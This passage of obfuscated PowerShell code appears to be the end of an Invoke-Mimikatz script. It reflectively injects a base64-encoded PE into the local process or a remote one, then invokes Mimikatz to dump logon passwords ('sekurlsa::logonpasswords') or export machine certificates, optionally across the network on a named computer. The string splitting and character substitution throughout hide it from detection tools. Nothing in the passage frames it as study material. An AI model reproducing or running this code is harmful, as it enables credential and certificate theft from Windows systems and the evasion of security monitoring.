		if ((${pr`ociD} -ne ${NU`ll}) -and (${pr`o`CiD} -ne 0) -and (${P`RoC`Name} -ne ${N`UlL}) -and (${P`RoCN`Ame} -ne ""))
		{
			Throw ((("{1}{0}"-f 'nM','Ca')+'h'+("{1}{2}{0}" -f 'y ','4t s','uppl')+("{0}{1}" -f 'a ','Pro')+'cId'+' an'+'d'+("{0}{1}"-f ' ','Pro')+'cN'+'am'+("{0}{1}" -f 'e, ','c')+("{0}{1}{2}"-f'hoose',' o','ne')+' o'+("{0}{1}"-f'r t','he')+("{1}{0}"-f 'oth',' ')+'e'+'r')  -cRePlacE  ([CHAR]77+[CHAR]104+[CHAR]52),[CHAR]39)
		}
		elseif (${prOCN`A`me} -ne ${N`UlL} -and ${p`RO`cna`me} -ne "")
		{
			${PrO`Ces`seS} = @(&("{0}{2}{1}" -f 'G','ocess','et-Pr') -Name ${P`RoCN`AME} -ErrorAction ('Sil'+'ent'+'lyContin'+'u'+'e'))
			if (${pRO`C`EsseS}."c`ounT" -eq 0)
			{
				Throw (('Can'+'P7b'+'t ')."rEPLA`cE"(([ChAR]80+[ChAR]55+[ChAR]98),[STRinG][ChAR]39)+'fi'+'nd '+'pr'+("{0}{1}"-f 'oc','es')+'s '+"$ProcName")
			}
			elseif (${P`Ro`CeSSES}."c`Ount" -gt 1)
			{
				${p`RO`CIn`FO} = &("{2}{1}{0}{3}" -f'-Proce','et','G','ss') | &("{0}{1}"-f 'whe','re') { ${_}."n`AmE" -eq ${Pro`C`NaME} } | &("{0}{3}{2}{1}" -f 'Select','bject','O','-') ('Pro'+'ce'+'s'+'sName'), ('Id'), ('S'+'essi'+'onId')
				&("{0}{2}{1}{3}"-f'W','-Out','rite','put') ${pRoCI`N`Fo}
				Throw ('Mor'+'e '+'t'+("{0}{1}"-f'h','an ')+'on'+'e '+'i'+("{0}{1}" -f 'ns','tan')+'ce '+'of'+' '+("$ProcName "+'')+'f'+'ou'+("{1}{0}" -f' ','nd,')+'pl'+'e'+("{0}{1}"-f 'as','e ')+("{1}{2}{0}" -f 'fy','spec','i')+' '+'the'+' '+("{0}{1}" -f'pr','oc')+'e'+'ss '+'I'+'D '+'t'+'o '+("{1}{0}" -f'ect','inj')+' '+'i'+'n '+'t'+'o.')
			}
			else
			{
				${pROC`ID} = ${PR`O`CE`SsEs}[0]."I`D"
			}
		}
		
		
		





		
		if ((${p`ROcid} -ne ${nu`ll}) -and (${pr`OcId} -ne 0))
		{
			${RemOtEPr`o`C`haNdLe} = ${wi`N32`FuNCT`i`ONs}."oP`enP`Roce`sS"."IN`VOkE"(0x001F0FFF, ${F`AlSe}, ${proc`id})
			if (${reMo`TeProchA`N`dLe} -eq [IntPtr]::"z`ERO")
			{
				Throw ((("{0}{1}"-f 'C','ouldn')+("{0}{1}" -f'K','b7t '))."rEpL`A`ce"(([CHaR]75+[CHaR]98+[CHaR]55),[stRinG][CHaR]39)+'obt'+("{0}{1}"-f 'ai','n ')+'t'+'he '+'ha'+'ndl'+'e '+'for'+' '+("{1}{0}"-f 'roce','p')+'ss'+' '+'ID'+': '+"$ProcId")
			}
			
			&("{1}{2}{0}"-f 'ose','Wri','te-Verb') ('Go'+("{0}{1}"-f 't the ','h')+("{1}{2}{0}"-f 'e for','and','l')+' th'+'e '+("{0}{1}"-f 're','mo')+("{1}{0}" -f 'e pro','t')+("{0}{1}"-f'cess',' ')+'t'+'o'+("{1}{0}"-f 'e',' inj')+("{0}{1}{2}" -f 'ct ','in ','to'))
		}
		

		
		&("{0}{2}{3}{1}" -f 'Wri','e','t','e-Verbos') ('C'+("{0}{1}"-f 'al','li')+("{2}{1}{0}" -f 'ke','nvo','ng I')+'-'+'M'+'emo'+("{1}{0}"-f 'yLo','r')+("{1}{0}" -f'Li','ad')+'bra'+'ry')

        try
        {
            ${pro`CE`SsOrs} = &("{0}{1}{2}"-f 'Get','-WmiObj','ect') -Class ('Win32_Pr'+'oc'+'ess'+'or')
        }
        catch
        {
            throw (${_}."E`XCEpTIoN")
        }

        if (${pROce`SSO`Rs} -is [array])
        {
            ${proc`ess`or} = ${pRoc`Esso`Rs}[0]
        } else {
            ${pRoC`EsS`oR} = ${PR`oCesso`Rs}
        }

        if ( ( ${PROce`s`SoR}."aDdr`e`ssWi`DTH") -ne (([System.IntPtr]::"s`IZe")*8) )
        {
            &("{0}{2}{1}"-f'W','erbose','rite-V') ( ('Ar'+("{0}{1}" -f'c','hite')+("{0}{1}" -f'c','tur')+'e:'+' ') + ${PrOC`eS`SOr}."Ad`dr`E`SswIdtH" + (("{1}{0}" -f'oce',' Pr')+'ss:'+' ') + ([System.IntPtr]::"s`IzE" * 8))
            &("{0}{2}{1}" -f'Wri','rror','te-E') ((("{3}{1}{0}{2}" -f ' a','l','r','PowerShel')+'ch'+'i'+'te'+((("{3}{1}{2}{0}"-f 't',' (3','2bi','cture')))+'/6'+'4bit) doesn{0}'+'t '+("{0}{2}{1}" -f 'm','tch ','a')+("{1}{0}"-f ' a','OS')+("{2}{0}{1}"-f 'c','tu','rchite')+("{0}{1}" -f'r','e. 6')+("{0}{1}" -f '4bit ','PS')+' mu'+'st '+("{1}{0}{2}"-f 'e ','b','used o')+("{0}{1}"-f 'n a',' 6')+("{2}{0}{1}" -f'bit ','OS.','4'))-F  [CHAR]39) -ErrorAction ('Sto'+'p')
        }

        
        if ([System.Runtime.InteropServices.Marshal]::"sIz`E`of"([Type][IntPtr]) -eq 8)
        {
            [Byte[]]${PEby`T`ES} = [Byte[]][Convert]::('F'+'romB'+'ase64'+'Str'+'ing').Invoke(${pE`BY`Tes64})
        }
        else
        {
            [Byte[]]${peBY`T`ES} = [Byte[]][Convert]::('Fr'+'omBase64Strin'+'g').Invoke(${P`ebYte`s32})
        }
        ${PE`BY`TEs}[0] = 0
        ${P`Eb`YTeS}[1] = 0
		${pE`Hand`LE} = [IntPtr]::"zE`Ro"
		if (${R`Em`OTePro`cHANdle} -eq [IntPtr]::"ze`RO")
		{
			${P`Eload`EDI`NFO} = &("{1}{0}{2}{3}{5}{4}"-f 'oke-','Inv','Me','mo','dLibrary','ryLoa') -PEBytes ${P`e`BYtES} -ExeArgs ${e`xeA`RGs}
		}
		else
		{
			${P`el`oAdE`DInFO} = &("{5}{3}{4}{0}{1}{2}"-f'L','oad','Library','ok','e-Memory','Inv') -PEBytes ${PEBy`T`es} -ExeArgs ${eX`eAR`gS} -RemoteProcHandle ${r`Emot`epR`OChaNd`Le}
		}
		if (${pE`lOaD`E`DINFO} -eq [IntPtr]::"ze`Ro")
		{
			Throw ('Una'+'b'+'le '+'to '+("{2}{3}{0}{1}" -f'h','a','load PE',', ')+("{3}{2}{1}{4}{0}" -f' i',' return','dle','n','ed')+'s'+' NU'+'LL')
		}
		
		${p`EhAn`dLe} = ${PelOADe`DI`NFo}[0]
		${REmOTEpE`haN`d`lE} = ${peloaD`edin`Fo}[1] 
		
		
		
		${peI`NFO} = &("{1}{2}{4}{0}{3}"-f 'Inf','Ge','t-PED','o','etailed') -PEHandle ${pE`h`Andle} -Win32Types ${w`i`N3`2TyPES} -Win32Constants ${w`In32CO`NsT`ANtS}
		if ((${PeI`NfO}."fiLeTY`pE" -ieq ('D'+'LL')) -and (${rE`moTePR`oc`han`dle} -eq [IntPtr]::"Z`eRo"))
		{
			
			
			
                    &("{1}{2}{0}" -f'ose','W','rite-Verb') (("{0}{1}"-f 'C','all')+("{0}{1}"-f 'ing',' ')+("{0}{1}"-f 'f','uncti')+'on'+("{2}{1}{0}" -f' ','ith',' w')+'W'+'Str'+("{1}{2}{0}"-f't','ing',' re')+'u'+("{1}{0}" -f 'n t','r')+'yp'+'e')
				    [IntPtr]${w`sT`RIN`G`FunCAddR} = &("{1}{2}{5}{0}{4}{3}"-f'mor','G','et','ress','yProcAdd','-Me') -PEHandle ${p`ehaND`LE} -FunctionName ('pow'+'e'+'r'+'s'+("{1}{2}{0}"-f'l','hell_r','ef')+'ect'+'ive'+("{2}{1}{0}" -f 'ikatz','im','_m'))
				    if (${wstR`IN`G`FUNCADDR} -eq [IntPtr]::"Ze`RO")
				    {
					    Throw (('Cou'+'l'+'dnu'+'F'+("{0}{1}" -f'gt fi','nd')+("{0}{1}{2}"-f' f','u','ncti')+("{0}{1}{2}" -f'on ad','d','r')+'ess'+'.')  -cREPlacE 'uFg',[chAR]39)
				    }
				    ${WSTrINg`F`U`N`cdE`L`EGATE} = &("{3}{2}{4}{1}{0}" -f'pe','teTy','et-','G','Delega') @([IntPtr]) ([IntPtr])
				    ${WSTri`Ng`FU`NC} = [System.Runtime.InteropServices.Marshal]::('Ge'+'tDel'+'ega'+'t'+'e'+'ForFuncti'+'onPointer').Invoke(${w`STRi`NgFUNcADDr}, ${WS`T`R`in`gFUN`cdelEgATE})
                    ${WSt`R`iNgin`pUT} = [System.Runtime.InteropServices.Marshal]::('Str'+'ingToH'+'Glob'+'alUn'+'i').Invoke(${EX`eArGs})
				    [IntPtr]${OU`TPutp`Tr} = ${W`StrIN`gfU`Nc}."iN`VOke"(${wS`Tri`N`gInPUT})
                    [System.Runtime.InteropServices.Marshal]::('FreeHGlo'+'b'+'a'+'l').Invoke(${wst`R`I`Ng`iNpUT})
				    if (${outPUT`p`TR} -eq [IntPtr]::"z`Ero")
				    {
				    	Throw (("{2}{0}{1}" -f'le',' to ','Unab')+("{2}{1}{0}"-f 't out','e','g')+("{1}{0}" -f' O','put,')+("{0}{1}"-f'utpu','t P')+'tr'+("{0}{1}"-f ' ','is N')+'U'+'LL')
				    }
				    else
				    {
				        ${oUTp`Ut} = [System.Runtime.InteropServices.Marshal]::('P'+'trToSt'+'ringUni').Invoke(${outp`Utp`Tr})
				        &("{1}{0}{2}"-f 'utp','Write-O','ut') ${o`Utp`UT}
				        ${wi`N32f`UNCtI`oNS}."L`oCA`LFrEE"."InVo`kE"(${o`Utpu`TPTr});
				    }
			
			
			
		}
		
		elseif ((${p`EIN`FO}."Fil`Et`YPE" -ieq ('DL'+'L')) -and (${r`Em`OTEPr`OCHaND`le} -ne [IntPtr]::"Ze`RO"))
		{
			${vOi`dFuNC`AD`dR} = &("{2}{5}{4}{0}{1}{6}{3}" -f '-Mem','oryPr','G','ess','t','e','ocAddr') -PEHandle ${p`Eh`ANdLe} -FunctionName ('Voi'+'d'+("{0}{1}" -f 'Fun','c'))
			if ((${v`oid`FuncAddr} -eq ${nU`lL}) -or (${V`oIdFUncAD`dr} -eq [IntPtr]::"Z`ero"))
			{
				Throw ((("{1}{0}{2}"-f 'un','VoidF','c')+' '+("{0}{1}"-f'cou','ld')+("{0}{1}"-f 'n','Tcst')+' b'+("{0}{1}" -f 'e',' fo')+'u'+'n'+("{1}{0}{2}" -f' ','d','in the D')+'L'+'L')-repLaCe'Tcs',[ChaR]39)
			}
			
			${V`oi`DfU`Nc`ADDr} = &("{1}{5}{2}{6}{0}{3}{4}"-f'tA','Sub','Sig','sU','nsigned','-','nedIn') ${Vo`iD`FuncAD`Dr} ${PEHANd`LE}
			${Vo`idFuN`c`ADdR} = &("{0}{1}{2}{4}{3}" -f'Add-','Sign','edInt','igned','AsUns') ${v`o`i`df`UNCAdDr} ${REM`OT`E`PEHA`NDLE}
			
			
			${rTH`ReA`dHa`N`dle} = &("{0}{1}{4}{3}{2}"-f'Invoke','-Crea','read','teTh','teRemo') -ProcessHandle ${r`eMOT`EPROCH`And`LE} -StartAddress ${V`oi`DfuN`Ca`ddr} -Win32Functions ${WiN32f`Un`ct`IO`Ns}
		}
		
		
		if (${remOtEPrOch`AN`d`lE} -eq [IntPtr]::"z`eRO")
		{
			&("{2}{6}{4}{1}{3}{5}{0}" -f'ry','FreeLib','In','r','ry','a','voke-Memo') -PEHandle ${pehan`D`Le}
		}
		else
		{
			
			${SuCC`E`Ss} = ${Wi`N32`Fu`NcTions}."v`I`Rt`UAlFReE"."inV`o`ke"(${peH`An`DlE}, [UInt64]0, ${Wi`N32`Con`StantS}."M`eM_reLeA`SE")
			if (${s`UCce`ss} -eq ${FAl`se})
			{
				&("{1}{0}{2}{3}"-f'rit','W','e-War','ning') (('U'+("{1}{0}"-f 'e','nabl')+' to'+' c'+("{1}{0}" -f 'll ','a')+("{0}{1}{2}" -f'Vi','r','tualFr')+("{0}{2}{3}{1}" -f'ee','Eo',' on',' the P')+'8m'+'s '+("{1}{0}" -f 'ory','mem')+'.'+("{1}{2}{0}"-f 'i',' Con','t')+'n'+'u'+("{0}{1}"-f'i','ng ')+'an'+("{0}{1}" -f 'y','ways')+'.')."R`EP`laCE"(([char]111+[char]56+[char]109),[StRINg][char]39)) -WarningAction ('C'+'on'+'tinue')
			}
		}
		
		&("{1}{3}{2}{0}" -f 'ose','Wri','Verb','te-') ('Don'+'e!')
	}

	&("{0}{1}"-f 'M','ain')
}


Function M`AIN
{
	if ((${PSc`M`dlEt}."mYIn`VoCA`TI`on"."BOUNDp`ARA`meTers"[('D'+("{1}{0}"-f 'g','ebu'))] -ne ${nu`ll}) -and ${ps`C`MDl`eT}."MYiNvO`c`A`TiON"."BOUndPAR`AM`eT`ErS"[('D'+("{1}{0}"-f'ug','eb'))]."ISp`ReS`eNt")
	{
		${Debug`p`RE`FE`RenCE}  = (("{1}{0}" -f't','Con')+'in'+'ue')
	}
	
	&("{3}{0}{1}{2}" -f 'erb','o','se','Write-V') ('P'+("{0}{1}"-f'ow','erS')+("{0}{1}" -f'hel','l')+' '+'Pr'+("{1}{0}"-f 'essID','oc')+': '+"$PID")
	

	if (${p`s`cmDLET}.parameTErsETnAmE -ieq ('Dum'+'pC'+'r'+'eds'))
	{
		${e`xeaRgs} = (("{1}{2}{0}" -f'sa','sekur','l')+'::l'+'o'+'go'+("{1}{0}" -f'as','np')+'s'+'w'+("{0}{1}{2}" -f'or','ds',' exi')+'t')
	}
    elseif (${PS`CMdlET}.paraMetersETNAmE -ieq ('D'+("{0}{1}" -f 'umpCe','r')+'ts'))
    {
        ${exEa`R`GS} = ('c'+("{0}{1}{2}" -f 'ryp','t','o::')+'c'+'ng '+("{2}{1}{0}" -f 'ypto','r','c')+'::c'+'a'+'pi '+("`"crypto::certificates "+'')+("/export`" "+'')+("`"crypto::certificates "+'')+'/'+("{1}{0}"-f 'rt','expo')+' '+("/systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE`" "+'')+'ex'+'it')
    }
    else
    {
        ${exea`R`Gs} = ${CoM`m`AND}
    }

    [System.IO.Directory]::('S'+'etCur'+'r'+'e'+'ntDirect'+'o'+'ry').Invoke(${p`wd})

    
    
    

    
    
    

	if (${c`OM`puTErn`A`me} -eq ${nu`ll} -or ${C`o`MpUtErna`me} -imatch "^\s*$")
	{
		&("{0}{4}{1}{3}{2}" -f 'Inv','Com','nd','ma','oke-') -ScriptBlock ${r`emO`T`eSC`Riptb`lock} -ArgumentList @(${P`EbYT`eS64}, ${PE`Bytes`32}, ('Vo'+'id'), 0, "", ${eXeA`R`GS})
	}
	else
	{
		&("{1}{0}{2}{3}{4}"-f'e','Invok','-Co','mm','and') -ScriptBlock ${ReMotE`sCRiP`Tb`l`o`CK} -ArgumentList @(${P`EBY`Tes64}, ${p`Eb`ytes32}, ('V'+'oid'), 0, "", ${exE`AR`gs}) -ComputerName ${coMpUt`ErN`A`Me}
	}
}

&("{0}{1}" -f 'M','ain')
}
